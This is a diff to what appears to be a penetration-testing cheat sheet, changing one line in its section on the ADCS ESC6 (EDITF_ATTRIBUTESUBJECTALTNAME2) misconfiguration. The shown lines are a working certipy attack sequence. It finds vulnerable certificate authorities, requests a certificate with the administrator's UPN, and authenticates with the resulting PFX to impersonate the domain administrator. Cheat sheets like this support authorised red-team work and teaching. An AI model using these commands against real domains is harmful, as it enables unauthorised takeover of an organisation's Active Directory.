@@ -2744,7 +2744,7 @@ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 ##### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
 
 ```c
-certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -vulnerable -dc-ip 192.168.56.12 -stdout
+certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -vulnerable -dc-ip <RHOST> -stdout
 certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
 certipy req -ca '<CA>' -username administrator@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
 certipy auth -pfx administrator.pfx -dc-ip <RHOST>
